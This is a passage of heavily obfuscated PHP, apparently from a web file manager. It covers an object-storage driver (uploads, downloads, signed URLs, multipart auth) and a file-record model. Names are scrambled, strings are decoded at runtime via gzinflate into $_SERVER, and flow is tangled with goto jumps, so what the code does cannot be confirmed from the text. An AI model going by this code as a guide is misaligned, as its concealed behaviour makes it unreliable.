$cø≠“ÛüÈ◊); return !empty($Fﬂ—ŒñÃà¿) ? $this->getPathOuter($e©ò‚±Íùá) : !1; } $cÛÑÃøâ∏ = $this->client->multiUploadObject($AÃÂÏ’ûªÇ, $this->bucket, trim($e©ò‚±Íùá, $Eêƒãˆãæé[8]), $BÙ•›ı∏ÉÃ, $cø≠“ÛüÈ◊); return $cÛÑÃøâ∏ ? $this->getPathOuter($e©ò‚±Íùá) : !1; } public function download($d®≈´åÇ∏‚, $b•ßÂ¯›ÿÎ) { if (!@is_dir($this->pathFather($b•ßÂ¯›ÿÎ)) && !IO::mkdir($this->pathFather($b•ßÂ¯›ÿÎ))) { return !1; } $B∑É∏Ã©∏± = $this->client->getObject($this->bucket, $d®≈´åÇ∏‚, array(), $b•ßÂ¯›ÿÎ); return $B∑É∏Ã©∏± !== !1 ? $b•ßÂ¯›ÿÎ : !1; } public function link($B«∫ÒÓàî’, $EÍô·ÇÔ–” = array()) { $F∫â‹óæÑ– =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->signVer == $F∫â‹óæÑ–[212]) { return $this->client->getAuthenticatedURL($this->bucket, $B«∫ÒÓàî’, 3600 * 12, $EÍô·ÇÔ–”); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B«∫ÒÓàî’, $F∫â‹óæÑ–[8]), 3600 * 12, $this->region, array(), !0, $EÍô·ÇÔ–”); } public function fileOut($Cà∫Ö™‹ö¬, $A§·ëñ•‚∏ = false, $cÂª¥ËÈ€¿ = false, $aÊÇÖﬂÉ∏˘ = '') { goto Bı¨≠ÆÑ≠ô; EÉÉˆ£ÉË : $fÏÍ≤†åÛ≈ = array($f–ìÛ›üµ¯[216] => $A§·ëñ•‚∏ . $f–ìÛ›üµ¯[217] . rawurlencode($cÂª¥ËÈ€¿), $f–ìÛ›üµ¯[218] => $F‡…«ÇüÏı); $Cµù√Ë™Çà = $this->link($Cà∫Ö™‹ö¬, $fÏÍ≤†åÛ≈); $this->fileOutLink($Cµù√Ë™Çà); goto CÂÊ †ˆ••; E∂≥‚üÈèê: $F‡…«ÇüÏı = get_file_mime(get_path_ext($cÂª¥ËÈ€¿)); if ($F‡…«ÇüÏı == $f–ìÛ›üµ¯[213]) { return parent::fileOut($Cà∫Ö™‹ö¬, $A§·ëñ•‚∏, $cÂª¥ËÈ€¿, $aÊÇÖﬂÉ∏˘); } $A§·ëñ•‚∏ = $A§·ëñ•‚∏ ? $f–ìÛ›üµ¯[214] : $f–ìÛ›üµ¯[215]; goto EÉÉˆ£ÉË ; Bı¨≠ÆÑ≠ô: $f–ìÛ›üµ¯ =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cà∫Ö™‹ö¬, $A§·ëñ•‚∏, $cÂª¥ËÈ€¿, $aÊÇÖﬂÉ∏˘); } if (!$cÂª¥ËÈ€¿) { $cÂª¥ËÈ€¿ = $this->pathThis($Cà∫Ö™‹ö¬); } goto E∂≥‚üÈèê; CÂÊ †ˆ••: } public function fileOutServer($bº∫≈èƒí§, $fÜåè√„π˘ = false, $fì¿Á«Úää = false, $bâÛïÏ®¬£ = '') { parent::fileOut($bº∫≈èƒí§, $fÜåè√„π˘, $fì¿Á«Úää, $bâÛïÏ®¬£); } public function fileOutImageServer($EÚúÊáÜœè, $C⁄‰∑·»Ã≠ = 250) { parent::fileOutImage($EÚúÊáÜœè, $C⁄‰∑·»Ã≠); } public function hashMd5($B §ÖŒÌŸ‡, $fë€ÎÖ…ÓŸ = '') { $C⁄∂å›ìÖç =& $_SERVER[Öíæ€“”≠éÏË]; $AÖåõù˘†§ = $this->objectMeta($B §ÖŒÌŸ‡); if (!$AÖåõù˘†§) { return !1; } $fë€ÎÖ…ÓŸ = $fë€ÎÖ…ÓŸ ? $fë€ÎÖ…ÓŸ : _get($AÖåõù˘†§, $C⁄∂å›ìÖç[219]); $fë€ÎÖ…ÓŸ = $fë€ÎÖ…ÓŸ ? $fë€ÎÖ…ÓŸ : _get($AÖåõù˘†§, $C⁄∂å›ìÖç[209], $C⁄∂å›ìÖç[33]); return $fë€ÎÖ…ÓŸ; } public function uploadFormData($Eâ¬‹æ˜◊ë, $cà˘ò∑î‘‡ = 3600) { $Aáß®ìŸ‚‰ =& $_SERVER[Öíæ€“”≠éÏË]; $b¨À«Ò–µä = $this->pathFather($Eâ¬‹æ˜◊ë); $FÕíÚºæ±¿ = $this->client->getHttpUploadPostParams($this->bucket, $b¨À«Ò–µä, $Aáß®ìŸ‚‰[192], $cà˘ò∑î‘‡); return array_merge((array) $FÕíÚºæ±¿, array($Aáß®ìŸ‚‰[175] => $this->getHost())); } public function multiUploadFormData($dÁà≈‹¢–ø, $Cëèê≈«›ƒ = 3600) { $a√—„‰£•å =& $_SERVER[Öíæ€“”≠éÏË]; $C‘∂√ÒÚ◊Ë = gmdate($a√—„‰£•å[220]); $A‹’Æõ˜€ê = array(); $F∆™î÷úΩŸ = $this->client->getUploadId($this->bucket, $dÁà≈‹¢–ø, $A‹’Æõ˜€ê); if (!$F∆™î÷úΩŸ) { return !1; } return array($a√—„‰£•å[221] => $F∆™î÷úΩŸ, $a√—„‰£•å[175] => $this->getHost() . $a√—„‰£•å[8] . $this->pathEncode($dÁà≈‹¢–ø), $a√—„‰£•å[222] => $C‘∂√ÒÚ◊Ë, $a√—„‰£•å[93] => $dÁà≈‹¢–ø); } public function multiUploadAuthData($A©Õ°€â‰¢, $cÈè¯ï°Ï∞ = array()) { goto c»ë´Æ§Ñ ; DàÒ⁄≠◊‰ß: $C†ú∑¯±¿ø = implode($Aﬁõ“Ω¶›È[229], $AÓΩÏ‡˜◊¨); $a’Æ†âåßç = base64_encode(hash_hmac($Aﬁõ“Ω¶›È[230], $C†ú∑¯±¿ø, $this->secret, !0)); $c∏ŒçÉëçŒ = $Aﬁõ“Ω¶›È[231] . $this->accessKey . $Aﬁõ“Ω¶›È[4] . $a’Æ†âåßç; goto EÀ„áÇÙÿ¥; EÀ„áÇÙÿ¥: if (strpos($FßœîΩÜŒå, $Aﬁõ“Ω¶›È[225]) === 0) { return array($Aﬁõ“Ω¶›È[232] => $c∏ŒçÉëçŒ, $Aﬁõ“Ω¶›È[222] => $C∞©°àÖàÉ); } return $c∏ŒçÉëçŒ; goto cÜ éŒ®ˆà; Câ™’›éá: $AÓΩÏ‡˜◊¨ = array($Aﬁõ“Ω¶›È[224], $Aﬁõ“Ω¶›È[33], $Aﬁõ“Ω¶›È[119], $Aﬁõ“Ω¶›È[33], "\x78\55\x61\155\x7a\x2d\x64\141\164\x65\x3a{$C∞©°àÖàÉ}", $Aﬁõ“Ω¶›È[8] . $this->bucket . $Aﬁõ“Ω¶›È[8] . $this->pathEncode($B°™≈”…ú—) . $FßœîΩÜŒå); if (strpos($FßœîΩÜŒå, $Aﬁõ“Ω¶›È[225]) === 0) { $AÓΩÏ‡˜◊¨[0] = $Aﬁõ“Ω¶›È[226]; } if (isset($cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[227]]) && $cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[227]] == $Aﬁõ“Ω¶›È[228]) { $AÓΩÏ‡˜◊¨[0] = $Aﬁõ“Ω¶›È[228]; } goto DàÒ⁄≠◊‰ß; c»ë´Æ§Ñ : $Aﬁõ“Ω¶›È =& $_SERVER[Öíæ€“”≠éÏË]; $C∞©°àÖàÉ = isset($cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[222]]) ? $cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[222]] : gmdate($Aﬁõ“Ω¶›È[220]); $FßœîΩÜŒå = isset($cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[168]]) ? $cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[168]] : $Aﬁõ“Ω¶›È[33]; goto D®‡¯ı‘è‘; D®‡¯ı‘è‘: $B°™≈”…ú— = $cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[93]]; unset($cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[93]]); if (isset($cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[223]])) { $cÈè¯ï°Ï∞[$Aﬁõ“Ω¶›È[222]] = $C∞©°àÖàÉ; return $this->listUploadParts($B°™≈”…ú—, $cÈè¯ï°Ï∞); } goto Câ™’›éá; cÜ éŒ®ˆà: } public function listUploadParts($Eèÿ‚˘èÚÁ, $eî‘†˜œÉ• = array()) { goto aÑÀºÿè´£; däÒÀÜ‡ì¥: $DÔ“õ¡•Ûé = $this->multiUploadAuthData($Eèÿ‚˘èÚÁ, $eî‘†˜œÉ•); if (empty($DÔ“õ¡•Ûé)) { return !1; } return array($b´´ÊèùÕ„[232] => $DÔ“õ¡•Ûé, $b´´ÊèùÕ„[222] => $eî‘†˜œÉ•[$b´´ÊèùÕ„[222]], $b´´ÊèùÕ„[234] => $bõ•¬∆òùö); goto eë’≈ˆâàÛ; aÑÀºÿè´£: $b´´ÊèùÕ„ =& $_SERVER[Öíæ€“”≠éÏË]; $b°¨Ü◊Ü‰ = str_replace($b´´ÊèùÕ„[233], $b´´ÊèùÕ„[33], $eî‘†˜œÉ•[$b´´ÊèùÕ„[168]]); $bõ•¬∆òùö = $this->client->listParts($this->bucket, $Eèÿ‚˘èÚÁ, $b°¨Ü◊Ü‰); goto c∏≈ÑÔÊ∞ˆ; c∏≈ÑÔÊ∞ˆ: if (!$bõ•¬∆òùö) { return !1; } unset($eî‘†˜œÉ•[$b´´ÊèùÕ„[223]], $eî‘†˜œÉ•[$b´´ÊèùÕ„[227]]); $eî‘†˜œÉ•[$b´´ÊèùÕ„[93]] = $Eèÿ‚˘èÚÁ; goto däÒÀÜ‡ì¥; eë’≈ˆâàÛ: } public function getHost() { return parent::getHost() . $_SERVER[Öíæ€“”≠éÏË][8] . $this->bucket; } public function size($d≤àÙï™£∏) { $Eè≥Ñ∞⁄•≠ = $this->objectMeta($d≤àÙï™£∏); return $Eè≥Ñ∞⁄•≠ ? $Eè≥Ñ∞⁄•≠[$_SERVER[Öíæ€“”≠éÏË][78]] : 0; } public function info($bºÓ÷ÖçâΩ) { if ($this->isFolder($bºÓ÷ÖçâΩ)) { return $this->folderInfo($bºÓ÷ÖçâΩ); } else { if ($this->isFile($bºÓ÷ÖçâΩ)) { return $this->fileInfo($bºÓ÷ÖçâΩ); } } return !1; } public function exist($A∑≤∞’≤◊) { return $this->isFile($A∑≤∞’≤◊) || $this->isFolder($A∑≤∞’≤◊); } public function isFile($b¯ù†êéå–) { return !$this->isFolder($b¯ù†êéå–) && $this->objectMeta($b¯ù†êéå–); } public function isFolder($CÃªÙñ√Í’) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][199], $CÃªÙñ√Í’); } protected function objectMeta($C”Ú’©ﬂ≈) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][200], $C”Ú’©ﬂ≈); } protected function _objectMeta($d™îùÆºÈ÷) { $E’©ñ¥•âò =& $_SERVER[Öíæ€“”≠éÏË]; $d™îùÆºÈ÷ = rtrim($d™îùÆºÈ÷, $E’©ñ¥•âò[8]); try { $FäÍŒÕ¢ûù = $this->client->getObjectInfo($this->bucket, $d™îùÆºÈ÷); if (!isset($FäÍŒÕ¢ûù[$E’©ñ¥•âò[219]]) && isset($FäÍŒÕ¢ûù[$E’©ñ¥•âò[235]])) { $FäÍŒÕ¢ûù[$E’©ñ¥•âò[219]] = $FäÍŒÕ¢ûù[$E’©ñ¥•âò[235]]; } } catch (Exception $bı÷ó‰ü§ø) { $FäÍŒÕ¢ûù = !1; } if (!$FäÍŒÕ¢ûù) { } return $FäÍŒÕ¢ûù; } protected function _isFolder($c≥ø∞“•âª) { goto bö è‚◊™ı; e‘Öàö—ãº: $AíÁÇŸ„Üæ = $this->client->getBucket($this->bucket, $c≥ø∞“•âª, null, 1); if (empty($AíÁÇŸ„Üæ[$F¥ûÔ©ìˆœ[198]])) { return !1; } $aï∫Çù¢·≥ = $AíÁÇŸ„Üæ[$F¥ûÔ©ìˆœ[198]][0][$F¥ûÔ©ìˆœ[28]]; goto CçËÃﬁë≥á; CÉ…˘⁄°ãõ: return !0; goto cÉ≤›°“‘Ñ; CçËÃﬁë≥á: return stripos($aï∫Çù¢·≥, $c≥ø∞“•âª . $F¥ûÔ©ìˆœ[8]) === 0 ? !0 : !1; if (substr($aï∫Çù¢·≥, -1) == $F¥ûÔ©ìˆœ[8]) { return !0; } if (get_path_this($aï∫Çù¢·≥) == get_path_this($c≥ø∞“•âª)) { return !1; } goto CÉ…˘⁄°ãõ; bö è‚◊™ı: $F¥ûÔ©ìˆœ =& $_SERVER[Öíæ€“”≠éÏË]; $c≥ø∞“•âª = rtrim($c≥ø∞“•âª, $F¥ûÔ©ìˆœ[8]); if ($c≥ø∞“•âª == $F¥ûÔ©ìˆœ[33] || $c≥ø∞“•âª == $F¥ûÔ©ìˆœ[8]) { return !0; } goto e‘Öàö—ãº; cÉ≤›°“‘Ñ: } } define($_SERVER[Öíæ€“”≠éÏË][236], 1); goto fÚïÇöê´‹; b¬∏øÉ’‰É: define($_SERVER[Öíæ€“”≠éÏË][0], $_SERVER[Öíæ€“”≠éÏË][1]); $_SERVER[ü“Ê˝] = explode($_SERVER[Öíæ€“”≠éÏË][2], gzinflate(substr($_SERVER[Öíæ€“”≠éÏË][3], 10, -8))); function binCheckEq($d¨Û¬ŒéÌû, $bÉ¯©§Éπë) { return $d¨Û¬ŒéÌû == $bÉ¯©§Éπë; } goto a£ƒÀÕ·Ì”; d™«ÜÃùçƒ: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\164\141\142\154\x65\x4e\141\155\x65" => "\151\x6f\137\x66\151\154\x65\x5f\x6d\145\164\x61", "\x6d\145\x74\x61\x46\x69\145\154\x64" => "\146\151\154\x65\x49\104"); public function fileInfo($D—∏ü°û÷ê) { $C÷ø£∂Òõù =& $_SERVER[Öíæ€“”≠éÏË]; static $DÿàÀ«ÔºÒ = array(); if (!isset($DÿàÀ«ÔºÒ[$D—∏ü°û÷ê])) { $AÇóèÖª¥ù = $C÷ø£∂Òõù[1755]; $CãËﬂ¶ñÿ = Model($C÷ø£∂Òõù[451])->field($AÇóèÖª¥ù)->where(array($C÷ø£∂Òõù[449] => $D—∏ü°û÷ê))->find(); $DÿàÀ«ÔºÒ[$D—∏ü°û÷ê] = $CãËﬂ¶ñÿ; } return $DÿàÀ«ÔºÒ[$D—∏ü°û÷ê]; } public function addFileByContent($d¥ŸÖÉÆëÕ = '', $bÀî≤¡Öäƒ = '') { goto Eπ‚∆Õæ°ë; dûÒ¢ƒ¿å¡: if (file_exists($B∞÷“ä†È÷)) { @unlink($B∞÷“ä†È÷); } return $EØ«ÏÛ≈œè; goto EÎ›ëçıÏ©; b ΩÀïÒàñ: $B∞÷“ä†È÷ = $f˜Àã…°‡  . $fÖ„¬Ü≥∞ã[1757] . rand_string(16); file_put_contents($B∞÷“ä†È÷, $d¥ŸÖÉÆëÕ); $EØ«ÏÛ≈œè = $this->addFile($B∞÷“ä†È÷, $bÀî≤¡Öäƒ, !0); goto dûÒ¢ƒ¿å¡; Eπ‚∆Õæ°ë: $fÖ„¬Ü≥∞ã =& $_SERVER[Öíæ€“”≠éÏË]; $f˜Àã…°‡  = TEMP_PATH . $fÖ„¬Ü≥∞ã[1756]; if (!is_dir($f˜Àã…°‡ )) { mk_dir($f˜Àã…°‡ ); } goto b ΩÀïÒàñ; EÎ›ëçıÏ©: } public function createFileName($bÑ”™Æ§Ì‚, $Cøäó≠∫•´ = false, $f¡ËÍÕçÆë = false) { goto d‹¨Üë†ƒè; aø¯ïêœ›¯: $aêò©‡ëß≥ = $a—ïÍ»Ÿµ™->pathFather($eŒ»Ÿô£√Î); static $C∏⁄È»Óóâ = false; $f„Ú˘£”ã‘ = $B©Ω∞≈ıí£[1758] . md5($aêò©‡ëß≥); goto aö‰ıÓµæ; aö‰ıÓµæ: if (!$C∏⁄È»Óóâ && !Cache::get($f„Ú˘£”ã‘)) { $C∏⁄È»Óóâ = !0; $Bß‰ÿÑºõ¡ = IO::mkdir($aêò©‡ëß≥); if (!IO::exist($Bß‰ÿÑºõ¡ . $B©Ω∞≈ıí£[774])) { IO::mkfile($Bß‰ÿÑºõ¡ . $B©Ω∞≈ıí£[774]); } Cache::set($f„Ú˘£”ã‘, 1, 3600 * 2); } return $eŒ»Ÿô£√Î; goto E®â◊¢öÇß; d‹¨Üë†ƒè: $B©Ω∞≈ıí£ =& $_SERVER[Öíæ€“”≠éÏË]; $a—ïÍ»Ÿµ™ = IO::init($B©Ω∞≈ıí£[8]); $eŒ»Ÿô£√Î = $this->makeFilePath($bÑ”™Æ§Ì‚, $a—ïÍ»Ÿµ™, $Cøäó≠∫•´, $f¡ËÍÕçÆë); goto aø¯ïêœ›¯; E®â◊¢öÇß: } public function makeFilePath($e≤≥µÔÔâÌ, $aóÌ∂≈‡≈ú, $cô·ÇØ⁄ëÇ = false, $aµÜ≈Ô“Ïı = false) { goto aèîö‹õŒ∂; D¿Ü»√ª”Ÿ: if (!$e≤≥µÔÔâÌ) { $dÇÕÿ‰ÇÙô = $Bã∞ß’ïıæ[1761]; } switch ($dÇÕÿ‰ÇÙô) { case $Bã∞ß’ïıæ[1762]: $Aﬁ§ƒ∞Õßÿ = $Aﬁ§ƒ∞Õßÿ . $Bã∞ß’ïıæ[95] . $aóÌ∂≈‡≈ú->ext($e≤≥µÔÔâÌ); if ($D√‚±Ì÷⁄ú == $Bã∞ß’ïıæ[1697]) { $Aﬁ§ƒ∞Õßÿ .= $Bã∞ß’ïıæ[1437]; } break; case $Bã∞ß’ïıæ[1763]: goto c«ÂßÒ§©ı; c«ÂßÒ§©ı: $câæ®«œÛÀ = Model($Bã∞ß’ïıæ[743])->get($Bã∞ß’ïıæ[744]); $D√ÿŒŸãÙè = substr(md5($Bã∞ß’ïıæ[745] . $câæ®«œÛÀ . date($Bã∞ß’ïıæ[721])), 0, 8); $aãÆà¥Òï¢ = KodIO::defaultDriver(); goto AÎ≈ä›ßßÃ; fÔÙÔﬂ±ñ—: if (IO::isTypeObject($Aﬁ§ƒ∞Õßÿ) && !IO::isUploadServer($Aﬁ§ƒ∞Õßÿ)) { if (IO::exist($Aﬁ§ƒ∞Õßÿ)) { return $Aﬁ§ƒ∞Õßÿ; } $Få·≤€Õ¥Ü = IO::setContent($Aﬁ§ƒ∞Õßÿ, $Bã∞ß’ïıæ[33]); if (!$Få·≤€Õ¥Ü) { show_json($Bã∞ß’ïıæ[1766], !1); } } CacheLock::unlock($c¶”ÆƒÀ∑Ú); break; goto E•´ÒçÈﬁﬂ; DÛˆÎè•¢®: CacheLock::lock($c¶”ÆƒÀ∑Ú); $Aﬁ§ƒ∞Õßÿ = $bÁπÚö⁄ú¶ . $e≤≥µÔÔâÌ; if (IO::exist($bÁπÚö⁄ú¶ . $e≤≥µÔÔâÌ)) { $c≤ä‹”¯¿æ = substr($e≤≥µÔÔâÌ, 0, strlen($e≤≥µÔÔâÌ) - strlen($D√‚±Ì÷⁄ú)); $cÈÈí†ÙúÎ = $aµÜ≈Ô“Ïı ? substr($aµÜ≈Ô“Ïı, 0, 5) : ($cô·ÇØ⁄ëÇ ? substr($cô·ÇØ⁄ëÇ, 0, 5) : rand_string(5)); $Aﬁ§ƒ∞Õßÿ = $bÁπÚö⁄ú¶ . $c≤ä‹”¯¿æ . $cÈÈí†ÙúÎ . $Bã∞ß’ïıæ[95] . $D√‚±Ì÷⁄ú; } goto fÔÙÔﬂ±ñ—; AÎ≈ä›ßßÃ: $bÁπÚö⁄ú¶ = $Bã∞ß’ïıæ[1133] . $aãÆà¥Òï¢[$Bã∞ß’ïıæ[394]] . $Bã∞ß’ïıæ[403] . date($Bã∞ß’ïıæ[1764]) . $D√ÿŒŸãÙè . $Bã∞ß’ïıæ[8]; if ($D√‚±Ì÷⁄ú == $Bã∞ß’ïıæ[1697]) { $e≤≥µÔÔâÌ .= $Bã∞ß’ïıæ[1437]; } $c¶”ÆƒÀ∑Ú = $Bã∞ß’ïıæ[1765] . $bÁπÚö⁄ú¶ . $e≤≥µÔÔâÌ; goto DÛˆÎè•¢®; E•´ÒçÈﬁﬂ: case $Bã∞ß’ïıæ[1761]: break; default: break; } return $Aﬁ§ƒ∞Õßÿ; goto b™Ë˘ÉπŒí; BÂ‹”È¥ãà: $Aﬁ§ƒ∞Õßÿ = $bÁπÚö⁄ú¶ . rand_string(5) . short_id(100); $e≤≥µÔÔâÌ = str_replace($Bã∞ß’ïıæ[8], $Bã∞ß’ïıæ[71], KodIO::clear($e≤≥µÔÔâÌ)); $D√‚±Ì÷⁄ú = $aóÌ∂≈‡≈ú->ext($e≤≥µÔÔâÌ); goto D¿Ü»√ª”Ÿ; aèîö‹õŒ∂: $Bã∞ß’ïıæ =& $_SERVER[Öíæ€“”≠éÏË]; $dÇÕÿ‰ÇÙô = Model($Bã∞ß’ïıæ[743])->get($Bã∞ß’ïıæ[1759]); $bÁπÚö⁄ú¶ = KodIO::defaultIO() . date($Bã∞ß’ïıæ[1760]); goto BÂ‹”È¥ãà; b™Ë˘ÉπŒí: } public function addFileByRemote($Bã≈ÃùÜÂâ, $DÒã·∂Ñì, $båÉå¬¯£ê = array()) { goto EÖŒ¡èÒ™Ë; F•Í∆‡Ω†è: if ($FÑ£§ª§∫π = $this->addFileCheckExist($B…ò∑ÉøÔ[$bâÖü≥ò•[171]], $B…ò∑ÉøÔ[$bâÖü≥ò•[170]], $B…ò∑ÉøÔ[$bâÖü≥ò•[78]])) { return $FÑ£§ª§∫π; } return $this->addFileData($B…ò∑ÉøÔ); goto AÕèÌç—ñé; EÖŒ¡èÒ™Ë: $bâÖü≥ò• =& $_SERVER[Öíæ€“”≠éÏË]; if (!IO::exist($Bã≈ÃùÜÂâ)) { return !1; } $bèÉ®√ÈîÖ = $båÉå¬¯£ê[$bâÖü≥ò•[170]] ? $båÉå¬¯£ê[$bâÖü≥ò•[170]] : $bâÖü≥ò•[33]; goto aÔÈéú≥∑Ù; aÔÈéú≥∑Ù: $f©»•Ñò‹à = IO::hashMd5($Bã≈ÃùÜÂâ, $bèÉ®√ÈîÖ); $Eƒïâ÷åëÀ = KodIO::defaultDriver(); $B…ò∑ÉøÔ = array($bâÖü≥ò•[562] => IO::size($Bã≈ÃùÜÂâ), $bâÖü≥ò•[1767] => 1, $bâÖü≥ò•[414] => $DÒã·∂Ñì, $bâÖü≥ò•[786] => $Eƒïâ÷åëÀ[$bâÖü≥ò•[394]], $bâÖü≥ò•[415] => $Bã≈ÃùÜÂâ, $bâÖü≥ò•[1768] => $båÉå¬¯£ê[$bâÖü≥ò•[171]] ? $båÉå¬¯£ê[$bâÖü≥ò•[171]] : IO::hashSimple($Bã≈ÃùÜÂâ), $bâÖü≥ò•[1769] => $f©»•Ñò‹à ? $f©»•Ñò‹à : $bèÉ®√ÈîÖ); goto F•Í∆‡Ω†è; AÕèÌç—ñé: } private function addFileData($E€Î¥∆ªÒ∏) { $aéÛ„ ∞Ì≤ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$E€Î¥∆ªÒ∏) { return !1; } $E€Î¥∆ªÒ∏[$aéÛ„ ∞Ì≤[78]] = intval($E€Î¥∆ªÒ∏[$aéÛ„ ∞Ì≤[78]]); if (!$E€Î¥∆ªÒ∏[$aéÛ„ ∞Ì≤[78]] && strlen($E€Î¥∆ªÒ∏[$aéÛ„ ∞Ì≤[171]]) > 32) { $E€Î¥∆ªÒ∏[$aéÛ„ ∞Ì≤[78]] = intval(substr($E€Î¥∆ªÒ∏[$aéÛ„ ∞Ì≤[171]], 32)); } $EøƒÛÁü–ß = $this->add($E€Î¥∆ªÒ∏); return $this->find($EøƒÛÁü–ß); } public function addFile($a‹”ËÌïíô, $b é√≈Û‘, $cŸäè∞„Æü = false) { goto d˘ﬂ†§ÃÉ∏; Aπæ ¬˘ „: return $cá†œ™Û∑Á; goto BÀö™ÊÒèæ; b»™∫î»å£: $bÔò–Ö∂à⁄ = $_SERVER[Öíæ€“”≠éÏË][1770] . $fè˜üùÖ÷∑; CacheLock::lock($bÔò–Ö∂à⁄); if ($CÌœÁ‹‡î∞ = $this->addFileCheckExist($BûÒõœÿ˘â, $fè˜üùÖ÷∑, $B¨Á§øèÔª)) { CacheLock::unlock($bÔò–Ö∂à⁄); return $CÌœÁ‹‡î∞; } goto fƒßê∏ãÇÖ; d˘ﬂ†§ÃÉ∏: $BûÒõœÿ˘â = IO::hashSimple($a‹”ËÌïíô); $fè˜üùÖ÷∑ = IO::hashMd5($a‹”ËÌïíô); $B¨Á§øèÔª = IO::size($a‹”ËÌïíô); goto b»™∫î»å£; fƒßê∏ãÇÖ: $f∞É’®≈˜® = $this->addFileMake($a‹”ËÌïíô, $B¨Á§øèÔª, $BûÒõœÿ˘â, $fè˜üùÖ÷∑, $b é√≈Û‘, $cŸäè∞„Æü); $cá†œ™Û∑Á = $this->addFileData($f∞É’®≈˜®); CacheLock::unlock($bÔò–Ö∂à⁄); goto Aπæ ¬˘ „; BÀö™ÊÒèæ: } public function addFileMake($Dà⁄¥Ì◊∑ë, $D∫‰®∑éÆ‰, $bñÆêï…Ÿ¨, $aÃ¥Ê‘ÜßË, $eç€Èå ÂÚ, $C„ôª˘«¡∞) { goto e‹´—‰ÿÎ‰; C„—§øîà†: $E”Ω∫Óë¬ = get_path_this($cåÊ˜¨≠å≈); if ($C„ôª˘«¡∞) { $fèıπéç∫á = IO::move($Dà⁄¥Ì◊∑ë, $B®˜¡«Œƒ›, !1, $E”Ω∫Óë¬); } else { $fèıπéç∫á = IO::copy($Dà⁄¥Ì◊∑ë, $B®˜¡«Œƒ›, !1, $E”Ω∫Óë¬); } if (!$fèıπéç∫á) { return !1; } goto DΩíÒ ãÌπ; e‹´—‰ÿÎ‰: $føëœÇÛ◊› =& $_SERVER[Öíæ€“”≠éÏË]; $cåÊ˜¨≠å≈ = $this->createFileName($eç€Èå ÂÚ, $bñÆêï…Ÿ¨, $aÃ¥Ê‘ÜßË); $B®˜¡«Œƒ› = get_path_father($cåÊ˜¨≠å≈); goto C„—§øîà†; DΩíÒ ãÌπ: $Fì∂Øîî›ﬁ = KodIO::defaultDriver(); $F·¥€µ≠ê = array($føëœÇÛ◊›[562] => $D∫‰®∑éÆ‰, $føëœÇÛ◊›[1767] => 1, $føëœÇÛ◊›[414] => $eç€Èå ÂÚ, $føëœÇÛ◊›[786] => $Fì∂Øîî›ﬁ[$føëœÇÛ◊›[394]], $føëœÇÛ◊›[415] => $cåÊ˜¨≠å≈, $føëœÇÛ◊›[1768] => $bñÆêï…Ÿ¨, $føëœÇÛ◊›[1769] => $aÃ¥Ê‘ÜßË); return $F·¥€µ≠ê; goto d◊ÁöÑå…â; d◊ÁöÑå…â: } public function addFileCheckExist($D£—ç€Æ≈Í, $EìîÏôªÇò, $dò¡ΩÉçÑâ) { $béûß«ª…“ =& $_SERVER[Öíæ€“”≠éÏË]; $aüî¿ÉØ€Ë = $this->findByHash($D£—ç€Æ≈Í, $EìîÏôªÇò); if (!$aüî¿ÉØ€Ë) { return !1; } $D∂ÀìœÜ∏Ç = array($béûß«ª…“[1767] => intval($aüî¿ÉØ€Ë[$béûß«ª…“[1771]]) + 1, $béûß«ª…“[562] => $dò¡ΩÉçÑâ); $this->where(array($béûß«ª…“[449] => $aüî¿ÉØ€Ë[$béûß«ª…“[448]]))->save($D∂ÀìœÜ∏Ç); return $aüî¿ÉØ€Ë; } public function remove($Aë¨÷Ï‡ÁÈ) { $this->linkCountChange($Aë¨÷Ï‡ÁÈ, !1); $this->clearEmpty(); return !0; } public function linkAdd($F∑À‡äÖÔ∆) { $this->linkCountChange($F∑À‡äÖÔ∆, !0); } public function linkCountChange($cΩ‹¨¬ìòî, $FŒÁ·◊…íÜ) { goto bÏéÛÍã¿; bÏéÛÍã¿: $B±ëæùàïã =& $_SERVER[Öíæ€“”≠éÏË]; if (!$cΩ‹¨¬ìòî) { return; } if (!is_array($cΩ‹¨¬ìòî)) { $cΩ‹¨¬ìòî = array($cΩ‹¨¬ìòî); } goto CÚñÛàòÖ¿; Fî‡èá›è‡: foreach ($AàÓâ¬ÜØ· as $E≠äÇ‚‰îû => $c∞Ê±à√“´) { $eû‡ﬁî§µÀ = $c∞Ê±à√“´ . $B±ëæùàïã[33]; if (!$d™Ì€ƒ∞”◊[$eû‡ﬁî§µÀ]) { $d™Ì€ƒ∞”◊[$eû‡ﬁî§µÀ] = array(); } $d™Ì€ƒ∞”◊[$eû‡ﬁî§µÀ][] = $E≠äÇ‚‰îû; } foreach ($d™Ì€ƒ∞”◊ as $c∞Ê±à√“´ => $C®ëÂ∞§òœ) { if (!$C®ëÂ∞§òœ) { continue; } $c∞Ê±à√“´ = $FŒÁ·◊…íÜ ? $c∞Ê±à√“´ : -intval($c∞Ê±à√“´); $bï‚Öæ¥Ã„ = array($B±ëæùàïã[448] => array($B±ëæùàïã[7], $C®ëÂ∞§òœ)); if ($c∞Ê±à√“´ < 0) { $bï‚Öæ¥Ã„[$B±ëæùàïã[1771]] = array($B±ëæùàïã[983], abs($c∞Ê±à√“´)); } $this->where($bï‚Öæ¥Ã„)->setAdd($B±ëæùàïã[1771], $c∞Ê±à√“´); } goto F∞â’√ê¨√; CÚñÛàòÖ¿: $AàÓâ¬ÜØ· = array(); foreach ($cΩ‹¨¬ìòî as $E≠äÇ‚‰îû) { $eû‡ﬁî§µÀ = $E≠äÇ‚‰îû . $B±ëæùàïã[33]; if (!$AàÓâ¬ÜØ·[$eû‡ﬁî§µÀ]) { $AàÓâ¬ÜØ·[$eû‡ﬁî§µÀ] 